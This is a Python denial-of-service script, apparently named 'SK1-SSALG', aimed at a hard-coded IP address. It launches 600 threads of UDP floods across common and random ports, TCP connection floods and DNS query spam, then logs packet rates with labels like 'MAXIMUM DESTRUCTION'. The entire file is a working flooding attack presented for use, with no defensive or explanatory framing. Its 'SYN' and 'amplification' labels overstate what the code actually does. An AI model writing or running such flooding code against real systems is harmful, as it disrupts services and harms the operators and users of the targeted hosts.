import socket
import threading
import time
import random
import struct

# TARGET
TARGET_IP = "62.109.121.42"

# RAW POWER CONFIG
UDP_THREADS = 400      # Raw UDP power
SYN_THREADS = 150      # Connection floods  
DNS_THREADS = 50       # DNS focus
TOTAL_THREADS = 600    # ALL AT ONCE

# SOCKET CONFIG
MAX_SOCKETS = 200

# Global trackers
packets_sent = 0
bytes_sent = 0
attack_start = time.time()

# ==================== RAW UDP CANNON ====================
def raw_udp_cannon(thread_id):
    global packets_sent, bytes_sent
    
    # Create dedicated socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # HUGE buffer
    
    # RAW PAYLOADS - MAX DAMAGE
    payloads = [
        b'\xFF' * 1024,  # Full blast
        b'\x00' * 1024,  # Null blast
        b'\xAA\x55' * 512,  # Pattern
        random.randbytes(1024),  # Chaos
        b'X' * 1024,  # Simple nuke
    ]
    
    while True:
        try:
            # MAXIMUM SEND - NO DELAYS
            for _ in range(15):  # 15 packets per loop
                payload = random.choice(payloads)
                
                # ALL PORTS AT ONCE
                for port in [53, 80, 443, 123, 161, 1900, 5060, 8080]:
                    sock.sendto(payload, (TARGET_IP, port))
                    packets_sent += 1
                    bytes_sent += len(payload)
                
                # RANDOM PORTS TOO
                for _ in range(5):
                    port = random.randint(1, 65535)
                    sock.sendto(payload, (TARGET_IP, port))
                    packets_sent += 1
                    bytes_sent += len(payload)
                    
        except:
            # INSTANT RECOVERY
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            except:
                pass

# ==================== SYN NUKE ====================
def syn_nuke(thread_id):
    global packets_sent
    
    # Multiple sockets per thread
    socks = []
    for _ in range(3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.0001)  # ULTRA FAST
            socks.append(s)
        except:
            pass
    
    target_ports = [80, 443, 22, 53, 3389, 8080, 8443, 21, 25, 110, 143]
    
    while True:
        try:
            # ATTACK ALL PORTS AT ONCE
            for port in target_ports:
                for sock in socks:
                    try:
                        sock.connect_ex((TARGET_IP, port))
                        packets_sent += 1
                    except:
                        pass
            
            # Create new sockets if old ones fail
            if random.random() < 0.1:
                for i in range(len(socks)):
                    try:
                        socks[i].close()
                        socks[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        socks[i].settimeout(0.0001)
                    except:
                        pass
                        
        except:
            pass

# ==================== DNS HAMMER ====================
def dns_hammer(thread_id):
    global packets_sent, bytes_sent
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # DNS amplification payloads
    dns_payloads = [
        # Standard DNS query
        b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x07example\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
        # Larger DNS
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03www\x06google\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
        # Random DNS
        random.randbytes(100),
    ]
    
    while True:
        try:
            # MASSIVE DNS SPAM
            for _ in range(20):  # 20 packets per loop
                payload = random.choice(dns_payloads)
                sock.sendto(payload, (TARGET_IP, 53))
                packets_sent += 1
                bytes_sent += len(payload)
                
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== LAUNCH ALL METHODS ====================
print("⚡ SK1-SSALG INITIALIZING")
print(f"🎯 TARGET: {TARGET_IP}")
print(f"💀 THREADS: {TOTAL_THREADS}")
print(f"🔥 METHODS: ALL AT ONCE")
print("="*50)

# Start UDP Cannons
for i in range(UDP_THREADS):
    t = threading.Thread(target=raw_udp_cannon, args=(i,))
    t.daemon = True
    t.start()

# Start SYN Nukes  
for i in range(SYN_THREADS):
    t = threading.Thread(target=syn_nuke, args=(i,))
    t.daemon = True
    t.start()

# Start DNS Hammers
for i in range(DNS_THREADS):
    t = threading.Thread(target=dns_hammer, args=(i,))
    t.daemon = True
    t.start()

print(f"✅ {TOTAL_THREADS} THREADS FIRING")
print("="*50)
print("SK1-SSALG ACTIVE | ALL METHODS SIMULTANEOUS\n")

# ==================== LOGGING ====================
last_log = time.time()
peak_pps = 0
peak_bw = 0

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate stats
    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
    bw_mbps = (bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    duration = int(current - attack_start)
    
    # Track peaks
    if pps > peak_pps:
        peak_pps = pps
    if bw_mbps > peak_bw:
        peak_bw = bw_mbps
    
    # Reset counters
    packets_sent = 0
    bytes_sent = 0
    
    # Display
    print(f"SK1-SSALG | {pps:,}/s | {bw_mbps:.1f}Mbps | {duration}s")
    
    # Show peak every 10 seconds
    if duration % 10 == 0:
        print(f"   PEAK: {peak_pps:,}/s | {peak_bw:.1f}Mbps")
    
    # Performance status
    if pps > 80000:
        print("   STATUS: MAXIMUM DESTRUCTION")
    elif pps > 50000:
        print("   STATUS: EXTREME FIREPOWER")
    elif pps > 30000:
        print("   STATUS: HEAVY ASSAULT")
    elif pps > 15000:
        print("   STATUS: ACTIVE COMBAT")
